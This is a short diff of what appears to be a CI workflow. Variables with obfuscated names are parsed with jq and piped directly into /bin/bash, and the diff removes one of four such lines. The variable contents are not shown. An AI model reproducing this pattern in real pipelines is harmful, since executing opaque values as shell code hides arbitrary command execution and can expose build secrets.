@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$gs9190" | jq -r .gdof28752 | /bin/bash
           printf '%s' "$dhmzd639" | jq -r .fpkv61 | /bin/bash
           printf '%s' "$awv7" | jq -r .e413 | /bin/bash
-          printf '%s' "$tkmch1" | jq -r .cd756 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
